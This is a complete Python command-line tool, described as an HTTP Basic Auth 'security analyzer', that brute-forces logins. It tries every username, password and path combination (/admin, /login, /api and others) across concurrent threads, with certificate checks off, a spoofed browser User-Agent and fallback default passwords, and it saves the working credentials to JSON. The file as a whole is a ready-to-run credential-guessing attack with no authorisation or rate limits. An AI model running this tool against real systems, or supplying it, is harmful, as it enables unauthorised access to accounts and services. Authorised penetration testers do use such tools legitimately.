import requests
from requests.auth import HTTPBasicAuth
import urllib3
import os
import argparse
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Suppress insecure request warnings if testing self-signed certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def load_wordlist(filepath):
    """Loads lines from a file into a list, ignoring empty lines and comments."""
    if not filepath or not os.path.exists(filepath):
        return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def test_credentials_for_path(session, target_url, path, username, password):
    """
    Tests a single path and credential pair. Strictly requires a 401 challenge 
    to prevent false positives on public pages.
    """
    url = f"{target_url.rstrip('/')}{path}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    try:
        # 1. Unauthenticated baseline request
        baseline = session.get(
            url,
            headers=headers,
            timeout=5,
            allow_redirects=True,
            verify=False
        )

        # Skip paths that don't exist
        if baseline.status_code == 404:
            return None

        # 2. Check if the endpoint explicitly challenges for HTTP Basic Auth
        auth_challenged = (baseline.status_code == 401 or 'WWW-Authenticate' in baseline.headers)

        # If the page doesn't challenge for HTTP Basic Auth, it's a public page.
        if not auth_challenged:
            return None

        # 3. Test credentials with HTTP Basic Auth
        resp = session.get(
            url,
            auth=HTTPBasicAuth(username, password),
            headers=headers,
            timeout=5,
            allow_redirects=True,
            verify=False
        )

        if resp.status_code in [200, 204, 302] and resp.status_code != 401:
            return {
                "username": username,
                "password": password,
                "path": path,
                "status_code": resp.status_code,
                "baseline_status": baseline.status_code
            }

    except requests.exceptions.RequestException:
        pass
        
    return None

def brute_force_auth(target_url, usernames_file, passwords_file, common_paths=None, max_threads=10):
    """
    Performs multithreaded brute-forcing across usernames, passwords, and paths.
    """
    if common_paths is None:
        common_paths = ["/", "/login", "/admin", "/api", "/secure"]

    usernames = load_wordlist(usernames_file)
    passwords = load_wordlist(passwords_file)

    if not usernames:
        usernames = ["admin", "root", "user"]
        print("[-] Usernames file not found or empty. Using default fallback list.")
    if not passwords:
        passwords = ["password", "123456", "admin"]
        print("[-] Passwords file not found or empty. Using default fallback list.")

    print(f"[*] Loaded {len(usernames)} username(s) and {len(passwords)} password(s).")
    print(f"[*] Target paths: {common_paths}")
    print(f"[*] Running with max {max_threads} concurrent threads...\n")

    valid_credentials = []
    session = requests.Session()

    # Generate task combinations
    tasks = []
    for user in usernames:
        for pwd in passwords:
            for path in common_paths:
                tasks.append((user, pwd, path))

    # Execute with ThreadPoolExecutor for high performance
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_task = {
            executor.submit(test_credentials_for_path, session, target_url, path, user, pwd): (user, pwd, path)
            for user, pwd, path in tasks
        }

        for future in as_completed(future_to_task):
            result = future.result()
            if result:
                valid_credentials.append(result)
                print(f"[+] [SUCCESS] Valid login found -> {result['username']}:{result['password']} at {result['path']} (Status: {result['status_code']})")

    return valid_credentials

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced HTTP Basic Auth Security Analyzer")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("--users", default="usernames.txt", help="Path to usernames wordlist")
    parser.add_argument("--passwords", default="passwords.txt", help="Path to passwords wordlist")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("-o", "--output", help="Save results to a JSON file")

    args = parser.parse_args()

    print(f"[*] Starting HTTP Auth analysis on: {args.url}")
    start_time = datetime.now()
    
    found = brute_force_auth(args.url, args.users, args.passwords, max_threads=args.threads)

    duration = datetime.now() - start_time
    print(f"\n[+] Scan Complete in {duration.total_seconds():.2f}s. Total valid credentials found: {len(found)}")

    if args.output and found:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(found, f, indent=4)
        print(f"[*] Results successfully exported to {args.output}")
